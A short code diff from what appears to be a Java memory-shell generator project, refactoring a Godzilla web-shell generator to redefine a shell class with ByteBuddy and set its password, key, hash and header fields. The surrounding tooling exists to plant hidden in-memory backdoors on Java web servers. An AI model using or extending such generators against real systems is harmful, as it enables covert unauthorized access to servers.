@@ -2,6 +2,7 @@ package com.reajason.javaweb.memshell.generator;
 
 import com.reajason.javaweb.memshell.config.GodzillaConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
+import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
 import org.apache.commons.codec.digest.DigestUtils;
 
@@ -18,10 +19,12 @@ public class GodzillaGenerator extends ByteBuddyShellGenerator<GodzillaConfig> {
     }
 
     @Override
-    public DynamicType.Builder<?> build(DynamicType.Builder<?> builder) {
+    public DynamicType.Builder<?> getBuilder() {
         String md5Key = DigestUtils.md5Hex(shellToolConfig.getKey()).substring(0, 16);
         String md5 = DigestUtils.md5Hex(shellToolConfig.getPass() + md5Key).toUpperCase();
-        return builder.field(named("pass")).value(shellToolConfig.getPass())
+        return new ByteBuddy()
+                .redefine(shellToolConfig.getShellClass())
+                .field(named("pass")).value(shellToolConfig.getPass())
                 .field(named("key")).value(md5Key)
                 .field(named("md5")).value(md5)
                 .field(named("headerName")).value(shellToolConfig.getHeaderName())
